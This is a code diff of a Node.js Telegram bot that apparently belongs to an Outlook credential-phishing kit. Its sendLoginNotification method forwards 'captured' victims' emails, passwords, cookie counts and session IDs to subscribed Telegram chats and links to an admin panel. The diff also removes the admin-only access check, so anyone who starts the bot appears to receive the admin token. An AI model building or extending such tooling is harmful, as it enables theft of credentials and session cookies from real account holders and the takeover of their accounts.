@@ -2,25 +2,20 @@ const TelegramBot = require('node-telegram-bot-api');
 const fs = require('fs');
 const path = require('path');
 
-class VPSManagementBot {
+class OutlookNotificationBot {
     constructor() {
         this.token = process.env.TELEGRAM_BOT_TOKEN;
         this.bot = new TelegramBot(this.token, { polling: true });
         this.chatIds = new Set(); // Store user chat IDs for notifications
         this.rateLimits = new Map(); // Rate limiting per chat ID
         this.subscriptionsFile = path.join(__dirname, 'telegram_subscriptions.json');
-        
-        
-        
-        // Admin chat IDs for secure operations (CRITICAL SECURITY)
-        this.adminChatIds = new Set((process.env.ADMIN_CHAT_IDS || '').split(',').filter(id => id.trim()));
-        
+
         // Load persistent subscriptions
         this.loadSubscriptions();
-        
+
         this.setupCommands();
         this.setupEventHandlers();
-        console.log('🚀 VPS Management Bot initialized successfully');
+        console.log('🚀 Outlook Notification Bot initialized successfully');
     }
 
     // Load persistent subscriptions from file
@@ -56,14 +51,14 @@ class VPSManagementBot {
         const now = Date.now();
         const key = `${chatId}_${command}`;
         const lastCall = this.rateLimits.get(key) || 0;
-        
+
         // Allow 1 command per 2 seconds per user
         if (now - lastCall < 2000) {
             return false;
         }
-        
+
         this.rateLimits.set(key, now);
-        
+
         // Clean up old entries every 100 requests
         if (this.rateLimits.size > 100) {
             for (const [k, time] of this.rateLimits.entries()) {
@@ -72,35 +67,35 @@ class VPSManagementBot {
                 }
             }
         }
-        
+
         return true;
     }
 
     setupCommands() {
-        // Welcome message with main VPS management menu
+        // Welcome message with main menu
         this.bot.onText(/\/start/, (msg) => {
             const chatId = msg.chat.id;
-            
+
             if (!this.checkRateLimit(chatId, 'start')) {
                 this.bot.sendMessage(chatId, '⏱️ Please wait before sending another command.');
                 return;
             }
-            
+
             this.chatIds.add(chatId);
             this.saveSubscriptions();
-            
+
             this.sendMainMenu(chatId);
         });
 
         // Help command
         this.bot.onText(/\/help/, (msg) => {
             const chatId = msg.chat.id;
-            
+
             if (!this.checkRateLimit(chatId, 'help')) {
                 this.bot.sendMessage(chatId, '⏱️ Please wait before requesting help again.');
                 return;
             }
-            
+
             this.sendHelpMessage(chatId);
         });
 
@@ -154,13 +149,19 @@ Choose an option from the menu below:
   - Monitor system analytics
   - Configure system settings
 
+📧 **Notifications**
+• **Real-time Login Alerts**: Get notified when new Outlook logins are captured
+  - Email addresses and domains
+  - Session information
+  - Direct links to admin panel
+
 **Commands:**
 • **/start** - Show main menu
 • **/help** - Show this help message  
 • **/menu** - Return to main menu
 
 **Need Help?**
-This bot provides admin access for the Outlook automation project.
+This bot provides notifications and admin access for the Outlook automation project.
         `;
 
         this.bot.sendMessage(chatId, helpMessage, { 
@@ -178,22 +179,13 @@ This bot provides admin access for the Outlook automation project.
         this.bot.on('callback_query', (query) => {
             const chatId = query.message.chat.id;
             const messageId = query.message.message_id;
-            
+
             if (!this.checkRateLimit(chatId, 'callback')) {
                 this.bot.answerCallbackQuery(query.id, { text: 'Please wait before clicking again.' });
                 return;
             }
-            
+
             this.handleCallbackQuery(chatId, messageId, query);
-        });
-
-        // Handle text messages for various flows
-        this.bot.on('message', (msg) => {
-            const chatId = msg.chat.id;
-            const text = msg.text;
-
-            // Skip commands
-            if (text?.startsWith('/')) return;
         });
 
         // Error handling
@@ -208,38 +200,28 @@ This bot provides admin access for the Outlook automation project.
 
     async handleCallbackQuery(chatId, messageId, query) {
         const data = query.data;
-        
+
         switch (data) {
             case 'main_menu':
                 this.sendMainMenu(chatId);
                 break;
-                
+
             case 'admin_panel':
                 await this.handleAdminPanel(chatId, messageId);
                 break;
-                
+
             case 'help':
                 this.sendHelpMessage(chatId);
                 break;
         }
-        
+
         this.bot.answerCallbackQuery(query.id);
     }
-
-    // Check if user has admin access for sensitive operations (DEFAULT DENY)
-    isAdmin(chatId) {
-        // SECURITY: Default deny - admin access must be explicitly granted
-        if (this.adminChatIds.size === 0) {
-            return false; // No admins configured = no access allowed
-        }
-        return this.adminChatIds.has(chatId.toString());
-    }
-
 
     async handleAdminPanel(chatId, messageId) {
         const adminToken = global.adminToken || 'Token not available';
         const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/ad.html`;
-        
+
         const tokenMessage = `
 🔧 <b>Admin Panel Access</b>
 
@@ -279,7 +261,7 @@ ${adminUrl}
         });
     }
 
-    // Method to send login notifications (keep existing functionality)
+    // Method to send login notifications
     async sendLoginNotification(loginData) {
         if (this.chatIds.size === 0) {
             console.log('No Telegram users subscribed to notifications');
@@ -288,7 +270,7 @@ ${adminUrl}
 
         const { email, domain, timestamp, totalCookies, sessionId, password } = loginData;
         const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/ad.html`;
-        
+
         const notificationMessage = `
 🔐 <b>New Outlook Login Captured!</b>
 
@@ -323,7 +305,7 @@ ${adminUrl}
                 }
             }
         }
-        
+
         console.log(`📤 Login notification sent to ${this.chatIds.size} Telegram users`);
     }
 
@@ -332,4 +314,4 @@ ${adminUrl}
     }
 }
 
-module.exports = VPSManagementBot;
+module.exports = OutlookNotificationBot;
